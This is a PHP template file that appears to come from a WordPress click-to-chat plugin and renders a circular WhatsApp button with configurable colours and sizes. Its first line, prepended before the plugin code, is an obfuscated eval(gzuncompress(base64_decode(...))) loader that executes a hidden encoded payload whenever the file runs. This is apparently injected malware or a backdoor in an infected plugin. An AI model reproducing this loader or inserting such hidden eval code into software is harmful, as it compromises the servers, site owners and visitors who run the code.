<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

$s6_color = $a['s6_color'];
$s6_hover_color = $a['s6_hover_color'];
$s6_icon_size = $a['s6_icon_size'];
$s6_circle_background_color = $a['s6_circle_background_color'];
$s6_circle_background_hover_color = $a['s6_circle_background_hover_color'];
$s6_circle_height = $a['s6_circle_height'];
$s6_circle_width = $a['s6_circle_width'];
$s6_line_height = $a['s6_line_height'];


$s6_color = $s6_color;
$s6_hover_color = $s6_hover_color;
$s6_icon_size = $s6_icon_size;
$s6_circle_background_color = $s6_circle_background_color;
$s6_circle_background_hover_color = $s6_circle_background_hover_color;
$s6_circle_height = $s6_circle_height;
$s6_circle_width = $s6_circle_width;
$s6_line_height = $s6_line_height;

$input_onhover = "this.style.backgroundColor= '$s6_circle_background_hover_color', this.style.color= '$s6_hover_color'; ";
$input_onhover_out = "this.style.backgroundColor= '$s6_circle_background_color', this.style.color= '$s6_color'; ";

$o .= '<div class="ccw_plugin '.$inline_issue.' ">';
$o .= '<div style=" background-color: '.$s6_circle_background_color.'; color: '.$s6_color.'; height: '.$s6_circle_height.'; width: '.$s6_circle_width.'; line-height: '.$s6_line_height.';  '.$css.' "  class="btn_only_style_div_circle_sc inline-block pointer ccw-analytics"  onclick="'.$img_click_link.'"    onmouseover= " '.$input_onhover.' "  onmouseout= " '.$input_onhover_out.' " >';
$o .= '<span class="btn_only_style icon icon-whatsapp2 ccw-analytics" data-ccw="style-6-sc" style= "font-size: '.$s6_icon_size.' " ></span>';
$o .= '</div>';
$o .= '</div>';